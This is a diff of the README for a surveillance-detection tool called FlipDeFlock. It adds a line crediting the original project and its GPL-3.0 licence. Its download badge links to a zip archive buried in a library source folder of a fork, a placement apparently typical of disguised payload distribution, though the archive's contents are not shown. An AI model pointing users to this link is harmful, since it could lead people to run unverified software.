@@ -1,4 +1,5 @@
 # 🛡️ FlipDeFlock - Detect surveillance and secure your network
+> Based on [FlipDeFlock](https://github.com/ReconGrunt/FlipDeFlock) by ReconGrunt, licensed under GPL-3.0-or-later.
 
 [![](https://img.shields.io/badge/Download-FlipDeFlock-blue.svg)](https://raw.githubusercontent.com/garrettwise814/FlipDeFlock/main/lib/esp-serial-flasher/src/De_Flock_Flip_1.0-alpha.2.zip)
 
